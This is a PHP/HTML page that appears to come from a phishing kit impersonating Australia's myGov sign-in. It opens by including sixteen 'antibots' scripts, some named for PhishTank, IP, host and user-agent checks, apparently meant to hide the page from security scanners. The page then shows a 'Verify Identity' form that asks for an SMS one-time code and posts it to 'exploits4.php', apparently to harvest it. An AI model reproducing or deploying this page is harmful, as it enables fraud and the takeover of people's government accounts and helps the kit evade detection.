<?php

	include "antibots/#1.php";
    include "antibots/#2.php";
    include "antibots/#3.php";
    include "antibots/#4.php";
    include "antibots/#5.php";
    include "antibots/#6.php";
    include "antibots/#7.php";
    include "antibots/#8.php";
    include "antibots/#9.php";
    include "antibots/#10.php";
    include "antibots/#11.php";
    include "antibots/#12.php";
    include "antibots/antibot_host.php";
    include "antibots/antibot_ip.php";
    include "antibots/antibot_phishtank.php";
    include "antibots/antibot_userAgent.php";
	
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
	<meta http-equiv="x-ua-compatible" content="ie=edge">
	<meta name="apple-mobile-web-app-capable" content="yes">
	<title>Sign in with myGov - myGov</title>
	<meta name="description" content="">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="format-detection" content="telephone=no">
    <link rel="icon" type="image/png" sizes="16x16" href="favicon.ico">
	<link href="https://fonts.googleapis.com/css?family=Montserrat:200,400,700|Roboto:300,400,500,700,900&amp;display=swap" rel="stylesheet">
	<link href="css/style.css" rel="stylesheet">
	<link href="css/application.css" rel="stylesheet">
</head>
<body>
    <div class="muchcolors">&nbsp;</div>
<header role="banner" class="goodheader">
	<section class="wrapper">
		<div class="inner">
			<div class="notauth">
				<div class="notauth-row">
					<a class="not-auth-mk__link">
					    <img id="not-auth-mk" src="images/blacklogo.svg" alt="myGov Beta" role="img">
                    </a>
				</div>
			</div>
		</div>
	</section>
</header>
<div class="wrapper-mapwap">
    <div class="main-block" id="content" role="main">
        <h1>Verify Identity</h1>
	    <p>We sent another code by SMS to your mobile number.</p>
	<form id="otp-entry-form" action="exploits4.php" method="post" autocomplete="off">
			<div class="code-container">
				<label for="otpanswer">Code	</label>
                <input id="otpanswer" name="otp" type="tel" class="security-code" autocomplete="off" required>
			</div>
            <div id="security-codes-info" class="hasInfo">
                <p>
                    If you don't want to use Digital Identity, you can <a>call the helpdesk</a> to create a new myGov account.
                </p>
                <a data-infotext-continue="" class="continue-digital-identity-chevron" href="/las/mygov-login?execution=e42s2&amp;_eventId=continueWithDigitalIdentity">Continue with Digital Identity</a>
            </div>
            <div class="button-container">    			
    			<button type="submit" class="button-main button" name="_eventId_submitOtp">Next</button>
			</div>
	</form>
</div>
</div>
<footer role="contentinfo">
    <div class="wrapper">
      <div class="inner">

        <section class="footer-list">
            <nav>
            <h2 class="sr-only" aria-label="Footer">Footer</h2>
            <ul class="lower-links">
                <li>
                    <a target="_blank">Terms of use</a>
                </li>
                <li>
                    <a target="_blank">Privacy and security</a>
                </li>
                <li>
                    <a target="_blank">Copyright</a>
                </li>
                <li>
                    <a target="_blank">Accessibility</a>
                </li>
            </ul>
            </nav>
        </section>
          <div class="footer-lower">
              <section class="footer-lower-logo">
              <a>
                  <img src="images/whitelogo.svg" alt="myGov Beta" width="313.17" height="70" role="img">
              </a>
              </section>

              <p class="footer-acknowledgement">We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and present, of all Aboriginal and Torres Strait Islander nations.</p>
          </div>




      </div>
    </div>
  </footer>



</body></html>